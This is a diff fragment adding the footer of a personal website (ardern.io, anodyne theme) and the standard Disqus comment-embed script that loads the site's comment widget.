+            <div class="f6 f5-ns center tc white pt5 fw3">
+                ardern.io ~ © 2018  <!--anodyne theme-->
+            </div>
+        </div>
+    </div>
+
+<!-- After Footer -->
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'ardernio';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
